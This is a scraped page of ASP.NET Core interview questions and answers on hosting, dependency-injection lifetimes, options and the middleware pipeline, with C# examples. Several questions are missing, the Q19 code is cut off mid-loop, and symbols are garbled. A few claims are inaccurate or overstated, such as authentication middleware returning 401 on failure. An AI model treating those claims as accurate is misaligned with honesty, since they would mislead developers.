ASP.NET Core Interview Questions

1 Q1. What is ASP.NET Core and how is it different from ASP.NET Framework? ▼ 
ASP.NET Core is a cross-platform, high-performance, open-source framework 
for building modern web applications.

Key Differences:
| Feature           | ASP.NET Framework        | ASP.NET Core              |
|-------------------|--------------------------|---------------------------|
| Platform          | Windows only             | Cross-platform            |
| Performance       | Slower                   | Much faster               |
| Open Source       | Partially                | Fully open source         |
| Hosting           | IIS only                 | IIS, Kestrel, Docker      |
| Dependency Inj.   | Third-party (Ninject)    | Built-in DI               |
| Configuration     | web.config (XML)         | appsettings.json (JSON)   |
| Startup           | Global.asax              | Program.cs / Startup.cs   |
| Middleware        | HTTP Modules/Handlers    | Middleware pipeline        |
| Side-by-side      | No (machine-wide)        | Yes (app-level)           |
| Modularity        | Monolithic               | NuGet-based, modular      |
| Cloud-ready       | Limited                  | Built for cloud           |
| Minimal APIs      | No                       | Yes (.NET 6+)             |

ASP.NET Core advantages:
- 10x faster than ASP.NET Framework
- Runs on Windows, Linux, macOS
- Built-in dependency injection
- Unified MVC and Web API
- Modern tooling (CLI, VS Code)
- Docker/container support
- Lightweight and modular
2 Q2. What is the role of Program.cs and Startup.cs? ▼ 
In .NET 6+ (Minimal Hosting Model) � only Program.cs:

Program.cs handles EVERYTHING:
var builder = WebApplication.CreateBuilder(args);

// ===== SERVICE REGISTRATION (was ConfigureServices) =====
builder.Services.AddControllersWithViews();
builder.Services.AddDbContext<AppDbContext>(options =>
    options.UseSqlServer(builder.Configuration.GetConnectionString("Default")));
builder.Services.AddScoped<IProductService, ProductService>();
builder.Services.AddSession();
builder.Services.AddAuthentication();

var app = builder.Build();

// ===== MIDDLEWARE PIPELINE (was Configure) =====
if (app.Environment.IsDevelopment())
    app.UseDeveloperExceptionPage();
else
    app.UseExceptionHandler("/Home/Error");

app.UseHttpsRedirection();
app.UseStaticFiles();
app.UseRouting();
app.UseAuthentication();
app.UseAuthorization();
app.UseSession();

app.MapControllerRoute(
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");

app.Run();

In .NET 5 and earlier � Program.cs + Startup.cs:

Program.cs (entry point, creates host):
public class Program
{
    public static void Main(string[] args)
    {
        CreateHostBuilder(args).Build().Run();
    }
    
    public static IHostBuilder CreateHostBuilder(string[] args) =>
        Host.CreateDefaultBuilder(args)
            .ConfigureWebHostDefaults(webBuilder =>
            {
                webBuilder.UseStartup<Startup>();
            });
}

Startup.cs (services + middleware):
public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        services.AddControllersWithViews();
        // Register services
    }
    
    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
    {
        // Configure middleware pipeline
        app.UseRouting();
        app.UseEndpoints(endpoints => { endpoints.MapControllers(); });
    }
}
3 Q3. Explain the request pipeline in ASP.NET Core. ▼ 
The request pipeline is a series of middleware components that process 
HTTP requests and responses in a specific order.

Request Flow (top to bottom):
+-------------------------------------+
�         HTTP REQUEST                 �
+-------------------------------------�
�  1. Exception Handler Middleware     � ? Catches all exceptions
�  2. HTTPS Redirection               � ? Redirects HTTP to HTTPS
�  3. Static Files Middleware          � ? Serves CSS, JS, images
�  4. Routing Middleware               � ? Matches URL to endpoint
�  5. CORS Middleware                  � ? Cross-origin headers
�  6. Authentication Middleware        � ? Who are you?
�  7. Authorization Middleware         � ? Are you allowed?
�  8. Session Middleware               � ? Load session data
�  9. Endpoint Middleware              � ? Execute Controller/Action
+-------------------------------------�
�         HTTP RESPONSE                �
+-------------------------------------+

Key concepts:
- Each middleware can process request AND response
- Middleware executes in ORDER they are added
- Each middleware can short-circuit (stop pipeline)
- Response flows back in REVERSE order

Code:
app.UseExceptionHandler("/Error");  // 1st
app.UseHttpsRedirection();          // 2nd
app.UseStaticFiles();               // 3rd - short-circuits for static files
app.UseRouting();                   // 4th
app.UseCors();                      // 5th
app.UseAuthentication();            // 6th
app.UseAuthorization();             // 7th
app.UseSession();                   // 8th
app.MapControllerRoute(...);        // 9th - endpoint execution
4 Q4. What is Kestrel server? ▼ 
Kestrel is the default, cross-platform, high-performance web server for 
ASP.NET Core applications.

Key features:
- Built on libuv (now uses Socket transport)
- Cross-platform (Windows, Linux, macOS)
- Extremely fast (millions of requests/sec)
- Lightweight
- Supports HTTP/1.1, HTTP/2, HTTP/3
- Supports HTTPS/TLS
- Can be used standalone or behind reverse proxy

Deployment options:

1. Kestrel only (edge server):
Internet ? Kestrel ? ASP.NET Core App

2. Kestrel + Reverse Proxy (recommended for production):
Internet ? IIS/Nginx/Apache ? Kestrel ? ASP.NET Core App

Why use reverse proxy:
- SSL termination
- Load balancing
- Static file caching
- URL rewriting
- Security (hide Kestrel from internet)
- Request filtering

Configuration:
var builder = WebApplication.CreateBuilder(args);
builder.WebHost.ConfigureKestrel(options =>
{
    options.Limits.MaxRequestBodySize = 50 * 1024 * 1024; // 50MB
    options.Listen(IPAddress.Any, 5000);  // HTTP
    options.Listen(IPAddress.Any, 5001, listenOptions =>
    {
        listenOptions.UseHttps("certificate.pfx", "password");
    });
});

6 Q6. What is the wwwroot folder? ▼ 
wwwroot is the Web Root folder that contains all static files served directly 
to clients (browsers).

Contents:
wwwroot/
+-- css/
�   +-- site.css
�   +-- bootstrap.min.css
+-- js/
�   +-- site.js
�   +-- jquery.min.js
+-- images/
�   +-- logo.png
�   +-- banner.jpg
+-- lib/
�   +-- bootstrap/
�   +-- jquery/
+-- uploads/        (user uploaded files)
+-- favicon.ico

Key points:
- ONLY files in wwwroot are accessible via URL
- Files outside wwwroot are NOT accessible (secure by default)
- Served by UseStaticFiles() middleware
- URL maps directly: wwwroot/css/site.css ? /css/site.css
- No "wwwroot" in the URL

Access in code:
// IWebHostEnvironment.WebRootPath = physical path to wwwroot
var filePath = Path.Combine(_env.WebRootPath, "images", "logo.png");

In Views:
<img src="~/images/logo.png" />    <!-- ~ resolves to wwwroot -->
<link href="~/css/site.css" rel="stylesheet" />
<script src="~/js/site.js"></script>

Enable static files:
app.UseStaticFiles();  // Must be in pipeline to serve static files

Security: Never put sensitive files (config, source code, database) in wwwroot!

9 Q9. What is the difference between Development, Staging, and Production environments? ▼ 
DEVELOPMENT:
- Local developer machine
- Detailed error pages (UseDeveloperExceptionPage)
- Hot reload enabled
- Detailed logging
- No minification/bundling
- Swagger UI enabled
- Seed data / test data
- launchSettings.json used

STAGING:
- Pre-production environment
- Mirrors production setup
- Used for final testing
- Generic error pages
- Real database (copy of production)
- Performance testing
- UAT (User Acceptance Testing)

PRODUCTION:
- Live environment serving real users
- Generic error pages (no stack traces)
- Minified/bundled assets
- Caching enabled
- Minimal logging (Warning+)
- HTTPS enforced
- Security headers enabled
- Optimized performance

Code example:
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
    app.UseSwagger();
    app.UseSwaggerUI();
}
else
{
    app.UseExceptionHandler("/Home/Error");
    app.UseHsts();
    app.UseResponseCaching();
}

10 Q10. What is Generic Host vs Web Host? ▼ 
WEB HOST (older - .NET Core 2.x):
- Specifically designed for web applications
- Created with WebHost.CreateDefaultBuilder()
- Only for HTTP workloads
- Deprecated in favor of Generic Host

public static IWebHostBuilder CreateWebHostBuilder(string[] args) =>
    WebHost.CreateDefaultBuilder(args)
        .UseStartup<Startup>();

GENERIC HOST (.NET Core 3.0+):
- General-purpose host for ANY type of application
- Web apps, background services, console apps
- Created with Host.CreateDefaultBuilder()
- Recommended approach

public static IHostBuilder CreateHostBuilder(string[] args) =>
    Host.CreateDefaultBuilder(args)
        .ConfigureWebHostDefaults(webBuilder =>
        {
            webBuilder.UseStartup<Startup>();
        });

.NET 6+ (WebApplication - built on Generic Host):
var builder = WebApplication.CreateBuilder(args);  // Uses Generic Host internally
var app = builder.Build();
app.Run();

Generic Host provides:
- Dependency Injection
- Logging
- Configuration
- IHostedService (background services)
- App lifetime management

Key difference:
- Web Host: Only web apps
- Generic Host: Web apps + Worker services + Console apps + anything

Example - Worker Service (no web):
Host.CreateDefaultBuilder(args)
    .ConfigureServices(services =>
    {
        services.AddHostedService<MyBackgroundWorker>();
    });

11 Q11. What is Dependency Injection and why is it important? ▼ 
Dependency Injection (DI) is a design pattern where an object receives its 
dependencies from an external source rather than creating them itself.

Without DI (tight coupling):
public class OrderService
{
    private readonly SqlOrderRepository _repository;
    
    public OrderService()
    {
        _repository = new SqlOrderRepository();  // Hardcoded dependency!
        // Can't change to MongoRepository without modifying this class
        // Can't unit test with mock repository
    }
}

With DI (loose coupling):
public class OrderService
{
    private readonly IOrderRepository _repository;
    
    public OrderService(IOrderRepository repository)  // Injected!
    {
        _repository = repository;
        // Can be SqlRepository, MongoRepository, or MockRepository
    }
}

Why DI is important:
1. Loose Coupling: Classes don't depend on concrete implementations
2. Testability: Easy to inject mocks for unit testing
3. Maintainability: Change implementation without modifying consumers
4. Single Responsibility: Class doesn't create its own dependencies
5. Flexibility: Swap implementations easily (SQL ? MongoDB)
6. Lifetime Management: Container manages object creation and disposal

Types of Injection:
1. Constructor Injection (most common, recommended)
2. Method Injection (inject via method parameter)
3. Property Injection (not supported by default in ASP.NET Core)
12 Q12. What are the 3 service lifetimes � Transient, Scoped, Singleton? ▼ 
TRANSIENT:
- New instance created EVERY TIME it's requested
- Never shared between requests or within same request
- Shortest lifetime
- Registration: builder.Services.AddTransient<IService, Service>();

SCOPED:
- One instance PER HTTP REQUEST (per scope)
- Same instance within a single request
- Different instance for different requests
- Registration: builder.Services.AddScoped<IService, Service>();

SINGLETON:
- ONE instance for the ENTIRE application lifetime
- Same instance shared across all requests and all users
- Created on first request, never disposed until app shuts down
- Registration: builder.Services.AddSingleton<IService, Service>();

Visual example (3 requests):
Request 1:  Transient ? Instance A, Instance B (different each injection)
            Scoped    ? Instance C, Instance C (same within request)
            Singleton ? Instance D

Request 2:  Transient ? Instance E, Instance F (new instances)
            Scoped    ? Instance G, Instance G (same within request)
            Singleton ? Instance D (SAME as Request 1!)

Request 3:  Transient ? Instance H, Instance I (new instances)
            Scoped    ? Instance J, Instance J (same within request)
            Singleton ? Instance D (SAME as Request 1 & 2!)
13 Q13. When to use which lifetime? ▼ 
TRANSIENT - Use when:
- Service is lightweight and stateless
- No shared state needed
- Each consumer needs its own instance
- Examples: Email sender, PDF generator, validators

builder.Services.AddTransient<IEmailSender, EmailSender>();
builder.Services.AddTransient<IPdfGenerator, PdfGenerator>();

SCOPED - Use when:
- Service maintains state within a request
- Database context (EF Core DbContext)
- Unit of Work pattern
- Services that should be consistent within one request
- Most common choice for business services

builder.Services.AddScoped<IOrderService, OrderService>();
builder.Services.AddScoped<IUnitOfWork, UnitOfWork>();
builder.Services.AddDbContext<AppDbContext>();  // Scoped by default

SINGLETON - Use when:
- Service is expensive to create
- Service is thread-safe and stateless
- Caching services
- Configuration/settings
- HttpClient factory
- Logging

builder.Services.AddSingleton<ICacheService, MemoryCacheService>();
builder.Services.AddSingleton<IConfiguration>(config);

Rule of thumb:
- DbContext ? Scoped (always)
- Business services ? Scoped
- Utility services ? Transient
- Cache/Config ? Singleton
14 Q14. How to register and resolve services? ▼ 
REGISTRATION (in Program.cs):

// Interface ? Implementation
builder.Services.AddTransient<IEmailService, EmailService>();
builder.Services.AddScoped<IProductService, ProductService>();
builder.Services.AddSingleton<ICacheService, CacheService>();

// Concrete type (no interface)
builder.Services.AddScoped<ProductService>();

// With factory method
builder.Services.AddScoped<IDbConnection>(provider =>
    new SqlConnection(configuration.GetConnectionString("Default")));

// Register with implementation factory
builder.Services.AddScoped<IOrderService>(sp =>
{
    var dbContext = sp.GetRequiredService<AppDbContext>();
    var logger = sp.GetRequiredService<ILogger<OrderService>>();
    return new OrderService(dbContext, logger);
});

RESOLUTION (getting instances):

1. Constructor Injection (recommended):
public class ProductController : Controller
{
    private readonly IProductService _service;
    
    public ProductController(IProductService service)
    {
        _service = service;  // Automatically resolved by DI
    }
}

2. Method Injection ([FromServices]):
public IActionResult Index([FromServices] IProductService service)
{
    return View(service.GetAll());
}

3. Manual resolution (avoid if possible):
public IActionResult Index()
{
    var service = HttpContext.RequestServices.GetRequiredService<IProductService>();
    return View(service.GetAll());
}

4. In Middleware:
public class MyMiddleware
{
    public async Task InvokeAsync(HttpContext context, IProductService service)
    {
        // service injected per request
    }
}
15 Q15. What is Constructor Injection vs Method Injection? ▼ 
CONSTRUCTOR INJECTION:
- Dependencies injected through constructor
- Available throughout the class lifetime
- Most common and recommended approach
- Makes dependencies explicit and required

public class OrderController : Controller
{
    private readonly IOrderService _orderService;
    private readonly ILogger<OrderController> _logger;
    
    // All dependencies declared in constructor
    public OrderController(IOrderService orderService, ILogger<OrderController> logger)
    {
        _orderService = orderService;
        _logger = logger;
    }
    
    public IActionResult Index()
    {
        _logger.LogInformation("Getting orders");
        var orders = _orderService.GetAll();
        return View(orders);
    }
}

METHOD INJECTION:
- Dependencies injected into specific method only
- Used when dependency is needed only in one method
- Uses [FromServices] attribute in ASP.NET Core

public class ReportController : Controller
{
    // No constructor injection for rarely-used services
    
    public IActionResult Index()
    {
        return View();
    }
    
    // IPdfGenerator only needed here, not in every action
    public IActionResult ExportPdf([FromServices] IPdfGenerator pdfGenerator)
    {
        var pdf = pdfGenerator.Generate(data);
        return File(pdf, "application/pdf");
    }
}

When to use which:
- Constructor: Service used in multiple methods (most cases)
- Method: Service used in only one specific action
- Constructor: Required dependencies
- Method: Optional/rarely-used dependencies
16 Q16. What happens if you inject a Scoped service into a Singleton? ▼ 
This is a CAPTIVE DEPENDENCY problem and causes bugs!

Problem:
- Singleton lives for entire app lifetime
- Scoped service should live only for one request
- If Scoped is injected into Singleton, the Scoped instance is "captured"
  and reused across ALL requests (becomes effectively Singleton)

Example of the bug:
builder.Services.AddSingleton<ISingletonService, SingletonService>();
builder.Services.AddScoped<IScopedService, ScopedService>();

public class SingletonService : ISingletonService
{
    private readonly IScopedService _scopedService;  // DANGER!
    
    public SingletonService(IScopedService scopedService)
    {
        _scopedService = scopedService;
        // This scoped instance will be shared across ALL requests!
        // DbContext would share connections, cause threading issues
    }
}

Consequences:
- Data leaks between requests/users
- Thread safety issues
- DbContext disposed but still used
- Stale data

ASP.NET Core protection:
// In Development, this throws InvalidOperationException:
// "Cannot consume scoped service from singleton"
builder.Services.BuildServiceProvider(new ServiceProviderOptions
{
    ValidateScopes = true  // Enabled by default in Development
});

Valid combinations:
Singleton ? can inject ? Singleton only
Scoped    ? can inject ? Scoped + Singleton + Transient
Transient ? can inject ? Transient + Scoped + Singleton

Solution if Singleton needs Scoped:
public class SingletonService : ISingletonService
{
    private readonly IServiceScopeFactory _scopeFactory;
    
    public SingletonService(IServiceScopeFactory scopeFactory)
    {
        _scopeFactory = scopeFactory;
    }
    
    public void DoWork()
    {
        using var scope = _scopeFactory.CreateScope();
        var scopedService = scope.ServiceProvider.GetRequiredService<IScopedService>();
        scopedService.Process();
    }
}
17 Q17. How to use IServiceProvider manually? ▼ 
IServiceProvider is the DI container that resolves services. Usually you 
don't need it directly (prefer constructor injection), but sometimes it's needed.

Method 1: In Controller via HttpContext
public IActionResult Index()
{
    var service = HttpContext.RequestServices.GetRequiredService<IProductService>();
    // GetRequiredService throws if not registered
    // GetService returns null if not registered
    return View(service.GetAll());
}

Method 2: In Middleware
public class MyMiddleware
{
    private readonly RequestDelegate _next;
    
    public MyMiddleware(RequestDelegate next) { _next = next; }
    
    public async Task InvokeAsync(HttpContext context)
    {
        var service = context.RequestServices.GetRequiredService<IMyService>();
        await service.DoSomethingAsync();
        await _next(context);
    }
}

Method 3: IServiceScopeFactory (in Singleton/Background services)
public class BackgroundWorker : BackgroundService
{
    private readonly IServiceScopeFactory _scopeFactory;
    
    public BackgroundWorker(IServiceScopeFactory scopeFactory)
    {
        _scopeFactory = scopeFactory;
    }
    
    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        using var scope = _scopeFactory.CreateScope();
        var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        // Use dbContext within this scope
    }
}

Method 4: During startup
var app = builder.Build();
using (var scope = app.Services.CreateScope())
{
    var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();
    dbContext.Database.Migrate();  // Apply migrations at startup
}

When to use manual resolution:
- Background services needing scoped services
- Factory patterns
- Plugin/dynamic service resolution
- Startup initialization
18 Q18. What is the difference between AddSingleton, AddScoped, AddTransient? ▼ 
(Covered in Q12-Q13, here's a quick code comparison)

builder.Services.AddTransient<IService, Service>();
// New instance EVERY time it's injected (even multiple times in same request)

builder.Services.AddScoped<IService, Service>();
// Same instance within ONE request, new instance for each new request

builder.Services.AddSingleton<IService, Service>();
// ONE instance for entire application lifetime

Proof with GUIDs:
public class MyService : IMyService
{
    public Guid Id { get; } = Guid.NewGuid();
}

// Inject twice in same request:
public class TestController : Controller
{
    private readonly IMyService _service1;
    private readonly IMyService _service2;
    
    public TestController(IMyService service1, IMyService service2)
    {
        _service1 = service1;
        _service2 = service2;
    }
    
    public IActionResult Test()
    {
        // Transient:  _service1.Id ? _service2.Id (different instances)
        // Scoped:     _service1.Id == _service2.Id (same instance)
        // Singleton:  _service1.Id == _service2.Id (same instance, same across requests)
        return Content($"S1: {_service1.Id}, S2: {_service2.Id}");
    }
}
19 Q19. How to register multiple implementations of the same interface? ▼ 
Scenario: Multiple classes implement the same interface.

Method 1: Register all, inject IEnumerable<T>
builder.Services.AddTransient<INotificationService, EmailNotification>();
builder.Services.AddTransient<INotificationService, SmsNotification>();
builder.Services.AddTransient<INotificationService, PushNotification>();

public class NotificationManager
{
    private readonly IEnumerable<INotificationService> _services;
    
    public NotificationManager(IEnumerable<INotificationService> services)
    {
        _services = services;  // All 3 implementations
    }
    
    public async Task NotifyAll(string message)
    {
        foreach (var service in _services)

20 Q20. What is IOptions<T>, IOptionsSnapshot<T>, IOptionsMonitor<T>? ▼ 
All three are used to read configuration values using the Options Pattern.

IOptions<T>:
- Registered as SINGLETON
- Read once at startup, never changes
- Does NOT support reloading
- Best for settings that don't change

builder.Services.Configure<SmtpSettings>(config.GetSection("Smtp"));

public class EmailService
{
    private readonly SmtpSettings _settings;
    
    public EmailService(IOptions<SmtpSettings> options)
    {
        _settings = options.Value;  // Read once, cached forever
    }
}

IOptionsSnapshot<T>:
- Registered as SCOPED
- Re-reads configuration for EACH REQUEST
- Supports reloading (if appsettings.json changes)
- Cannot be injected into Singleton services

public class EmailService
{
    private readonly SmtpSettings _settings;
    
    public EmailService(IOptionsSnapshot<SmtpSettings> options)
    {
        _settings = options.Value;  // Fresh value per request
    }
}

IOptionsMonitor<T>:
- Registered as SINGLETON
- Supports real-time change notifications
- Can be injected into Singleton services
- Has OnChange callback

public class EmailService
{
    private SmtpSettings _settings;
    
    public EmailService(IOptionsMonitor<SmtpSettings> monitor)
    {
        _settings = monitor.CurrentValue;  // Current value
        
        monitor.OnChange(newSettings =>
        {
            _settings = newSettings;  // Called when config changes
            Console.WriteLine("Settings updated!");
        });
    }
}

Comparison:
| Feature          | IOptions<T>  | IOptionsSnapshot<T> | IOptionsMonitor<T> |
|------------------|--------------|---------------------|--------------------|
| Lifetime         | Singleton    | Scoped              | Singleton          |
| Reloads          | No           | Per request         | Real-time          |
| Change notify    | No           | No                  | Yes (OnChange)     |
| Use in Singleton | Yes          | No                  | Yes                |
| Performance      | Best         | Good                | Good               |

21 Q21. What is Middleware in ASP.NET Core? ▼ 
Middleware is software that's assembled into the application pipeline to handle 
requests and responses. Each middleware component:
- Chooses whether to pass the request to the next component
- Can perform work before and after the next component

Think of middleware as a series of "layers" that a request passes through.

Example:
app.Use(async (context, next) =>
{
    // Code BEFORE next middleware (request going in)
    Console.WriteLine("Before: " + context.Request.Path);
    
    await next();  // Call next middleware
    
    // Code AFTER next middleware (response coming back)
    Console.WriteLine("After: " + context.Response.StatusCode);
});

Built-in middleware examples:
- UseExceptionHandler ? Global error handling
- UseHttpsRedirection ? Redirect HTTP to HTTPS
- UseStaticFiles ? Serve static files (CSS, JS, images)
- UseRouting ? URL matching
- UseAuthentication ? Identify user
- UseAuthorization ? Check permissions
- UseCors ? Cross-origin resource sharing
- UseSession ? Session state
- UseResponseCaching ? Cache responses
22 Q22. How does the middleware pipeline work? ▼ 
The pipeline is a chain of middleware components. Each component:
1. Receives the request
2. Optionally processes it
3. Calls next() to pass to next middleware OR short-circuits
4. Optionally processes the response on the way back

Visual representation:
Request ?  [MW1] ? [MW2] ? [MW3] ? [Endpoint]
Response ? [MW1] ? [MW2] ? [MW3] ? [Endpoint]

Each middleware wraps the next one (like Russian dolls):

app.Use(async (context, next) =>
{
    Console.WriteLine("MW1 - Before");
    await next();
    Console.WriteLine("MW1 - After");
});

app.Use(async (context, next) =>
{
    Console.WriteLine("MW2 - Before");
    await next();
    Console.WriteLine("MW2 - After");
});

app.Run(async context =>
{
    Console.WriteLine("Terminal middleware");
    await context.Response.WriteAsync("Hello");
});

Output for a request:
MW1 - Before
MW2 - Before
Terminal middleware
MW2 - After
MW1 - After

Key principle: ORDER MATTERS! Middleware executes in the order it's added.
23 Q23. What is the difference between Use, Run, and Map? ▼ 
app.Use() - Adds middleware that CAN call next:
- Can pass request to next middleware
- Can do work before AND after next middleware
- Most common

app.Use(async (context, next) =>
{
    // Do something before
    await next();  // Pass to next middleware
    // Do something after
});

app.Run() - TERMINAL middleware (does NOT call next):
- Ends the pipeline
- Should be the LAST middleware
- No next() call

app.Run(async context =>
{
    await context.Response.WriteAsync("Hello World");
    // Pipeline ends here, no next middleware executes
});

app.Map() - BRANCHES the pipeline based on URL path:
- Creates a new branch for specific URL prefix
- Separate pipeline for that branch

app.Map("/api", apiApp =>
{
    apiApp.UseAuthentication();
    apiApp.Run(async context =>
    {
        await context.Response.WriteAsync("API Response");
    });
});

app.Map("/health", healthApp =>
{
    healthApp.Run(async context =>
    {
        await context.Response.WriteAsync("Healthy");
    });
});

app.MapWhen() - Conditional branching:
app.MapWhen(context => context.Request.Query.ContainsKey("debug"), debugApp =>
{
    debugApp.Run(async context =>
    {
        await context.Response.WriteAsync("Debug mode");
    });
});

app.UseWhen() - Conditional middleware (rejoins pipeline):
app.UseWhen(context => context.Request.Path.StartsWithSegments("/api"), appBuilder =>
{
    appBuilder.UseMiddleware<ApiLoggingMiddleware>();
    // Rejoins main pipeline after this
});
24 Q24. How to create custom middleware? ▼ 
Two approaches:

Method 1: Convention-based (class with InvokeAsync)
public class RequestTimingMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<RequestTimingMiddleware> _logger;
    
    // Constructor: receives next middleware + singleton services
    public RequestTimingMiddleware(RequestDelegate next, 
        ILogger<RequestTimingMiddleware> logger)
    {
        _next = next;
        _logger = logger;
    }
    
    // InvokeAsync: receives HttpContext + scoped services
    public async Task InvokeAsync(HttpContext context)
    {
        var stopwatch = Stopwatch.StartNew();
        
        // Before next middleware
        _logger.LogInformation("Request started: {Path}", context.Request.Path);
        
        await _next(context);  // Call next middleware
        
        // After next middleware
        stopwatch.Stop();
        _logger.LogInformation("Request completed: {Path} in {Ms}ms", 
            context.Request.Path, stopwatch.ElapsedMilliseconds);
        
        context.Response.Headers.Add("X-Response-Time", 
            stopwatch.ElapsedMilliseconds + "ms");
    }
}

// Extension method for clean registration
public static class RequestTimingMiddlewareExtensions
{
    public static IApplicationBuilder UseRequestTiming(this IApplicationBuilder builder)
    {
        return builder.UseMiddleware<RequestTimingMiddleware>();
    }
}

// Usage in Program.cs
app.UseRequestTiming();

Method 2: Factory-based (IMiddleware interface)
public class DbTransactionMiddleware : IMiddleware
{
    private readonly AppDbContext _dbContext;
    
    public DbTransactionMiddleware(AppDbContext dbContext)
    {
        _dbContext = dbContext;  // Scoped service injection works!
    }
    
    public async Task InvokeAsync(HttpContext context, RequestDelegate next)
    {
        using var transaction = await _dbContext.Database.BeginTransactionAsync();
        try
        {
            await next(context);
            await transaction.CommitAsync();
        }
        catch
        {
            await transaction.RollbackAsync();
            throw;
        }
    }
}

// Must register in DI
builder.Services.AddScoped<DbTransactionMiddleware>();
app.UseMiddleware<DbTransactionMiddleware>();
25 Q25. What is the order of middleware execution? ▼ 
Recommended order (as per Microsoft documentation):

app.UseExceptionHandler();       // 1. Exception handling (outermost)
app.UseHsts();                   // 2. HTTP Strict Transport Security
app.UseHttpsRedirection();       // 3. HTTPS redirect
app.UseStaticFiles();            // 4. Static files (short-circuits here)
app.UseCookiePolicy();           // 5. Cookie policy
app.UseRouting();                // 6. Route matching
app.UseRequestLocalization();    // 7. Localization
app.UseCors();                   // 8. CORS
app.UseAuthentication();         // 9. Authentication (WHO are you?)
app.UseAuthorization();          // 10. Authorization (CAN you access?)
app.UseSession();                // 11. Session
app.UseResponseCaching();        // 12. Response caching
app.MapControllerRoute(...);     // 13. Endpoint execution

Why order matters:
- ExceptionHandler must be first to catch ALL exceptions
- StaticFiles before Routing (no need to route static files)
- Authentication before Authorization (must know WHO before checking permissions)
- Routing before Authorization (need to know endpoint to check policy)
- CORS before Authentication (preflight requests need CORS headers)

Wrong order example:
app.UseAuthorization();    // ? Runs before knowing who the user is!
app.UseAuthentication();   // ? Too late, authorization already failed
26 Q26. What is short-circuiting in middleware? ▼ 
Short-circuiting means a middleware stops the pipeline and returns a response 
WITHOUT calling the next middleware. The remaining middleware never executes.

Example - Short-circuit for maintenance mode:
public class MaintenanceMiddleware
{
    private readonly RequestDelegate _next;
    private readonly bool _isMaintenanceMode;
    
    public MaintenanceMiddleware(RequestDelegate next, IConfiguration config)
    {
        _next = next;
        _isMaintenanceMode = config.GetValue<bool>("MaintenanceMode");
    }
    
    public async Task InvokeAsync(HttpContext context)
    {
        if (_isMaintenanceMode)
        {
            context.Response.StatusCode = 503;
            await context.Response.WriteAsync("Site under maintenance. Please try later.");
            return;  // SHORT-CIRCUIT! Don't call _next
        }
        
        await _next(context);  // Continue pipeline normally
    }
}

Built-in short-circuiting examples:
- UseStaticFiles: If file found in wwwroot, returns it without hitting MVC
- UseAuthentication: Returns 401 if auth fails
- UseAuthorization: Returns 403 if not authorized
- UseCors: Returns preflight response for OPTIONS requests

Example - IP whitelist:
public async Task InvokeAsync(HttpContext context)
{
    var clientIp = context.Connection.RemoteIpAddress?.ToString();
    var allowedIps = new[] { "192.168.1.1", "10.0.0.1" };
    
    if (!allowedIps.Contains(clientIp))
    {
        context.Response.StatusCode = 403;
        await context.Response.WriteAsync("Access denied");
        return;  // Short-circuit
    }
    
    await _next(context);
}

public class GlobalExceptionMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<GlobalExceptionMiddleware> _logger;
    
    public GlobalExceptionMiddleware(RequestDelegate next, 
        ILogger<GlobalExceptionMiddleware> logger)
    {
        _next = next;
        _logger = logger;
    }
    
    public async Task InvokeAsync(HttpContext context)
    {
        try
        {
            await _next(context);
        }
        catch (NotFoundException ex)
        {
            _logger.LogWarning(ex, "Resource not found");
            context.Response.StatusCode = 404;
            await context.Response.WriteAsJsonAsync(new { error = ex.Message });
        }
        catch (ValidationException ex)
        {
            _logger.LogWarning(ex, "Validation failed");
            context.Response.StatusCode = 400;
            await context.Response.WriteAsJsonAsync(new { errors = ex.Errors });
        }
        catch (UnauthorizedAccessException ex)
        {
            _logger.LogWarning(ex, "Unauthorized access");
            context.Response.StatusCode = 401;
            await context.Response.WriteAsJsonAsync(new { error = "Unauthorized" });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Unhandled exception");
            context.Response.StatusCode = 500;
            await context.Response.WriteAsJsonAsync(new 
            { 
                error = "An unexpected error occurred" 
            });
        }
    }
}

// Register FIRST in pipeline

28 Q28. What is UseRouting() vs UseEndpoints()? ▼ 
UseRouting():
- MATCHES the incoming URL to an endpoint
- Determines WHICH endpoint will handle the request
- Does NOT execute the endpoint
- Must come BEFORE authorization (so it knows which endpoint to check)

UseEndpoints() / MapControllerRoute():
- EXECUTES the matched endpoint
- Actually runs the Controller/Action
- Must come AFTER authorization

In .NET 6+:
app.UseRouting();          // Step 1: Match URL to endpoint
app.UseAuthentication();   // Step 2: Identify user
app.UseAuthorization();    // Step 3: Check if user can access matched endpoint
app.MapControllerRoute(    // Step 4: Execute the endpoint
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");

Why separated:
- Between UseRouting and endpoint execution, middleware can:
  - Know WHICH endpoint was matched
  - Apply authorization based on endpoint metadata
  - Apply CORS based on endpoint policy

// Middleware between routing and execution can access endpoint info:
app.Use(async (context, next) =>
{
    var endpoint = context.GetEndpoint();  // Available after UseRouting
    if (endpoint != null)
    {
        Console.WriteLine($"Matched: {endpoint.DisplayName}");
    }
    await next();
});

In .NET 6+, MapControllerRoute implicitly handles endpoint execution,
so explicit UseEndpoints() is often not needed.
29 Q29. What is UseAuthentication() vs UseAuthorization() order importance? ▼ 
UseAuthentication() - WHO are you?
- Reads authentication token/cookie from request
- Validates credentials
- Sets HttpContext.User (ClaimsPrincipal)
- Does NOT block requests (just identifies user)

UseAuthorization() - ARE YOU ALLOWED?
- Checks if the identified user has permission
- Evaluates [Authorize] attributes and policies
- Blocks unauthorized requests (401/403)
- Needs to know the endpoint (requires UseRouting before it)

CORRECT ORDER:
app.UseRouting();          // 1. Know which endpoint
app.UseAuthentication();   // 2. Know WHO the user is
app.UseAuthorization();    // 3. Check if user CAN access endpoint

WRONG ORDER:
app.UseAuthorization();    // ? Doesn't know who user is yet!
app.UseAuthentication();   // ? Too late, already denied/allowed

What happens with wrong order:
- Authorization runs but User is null/anonymous
- All [Authorize] endpoints return 401
- Authentication sets User but authorization already ran

Another wrong order:
app.UseAuthentication();
app.UseAuthorization();
app.UseRouting();          // ? Authorization doesn't know which endpoint!
// Authorization can't check endpoint-specific policies

31 Q31. What is Conventional Routing vs Attribute Routing? ▼ 
CONVENTIONAL ROUTING:
- Defined centrally in Program.cs
- Uses URL pattern templates
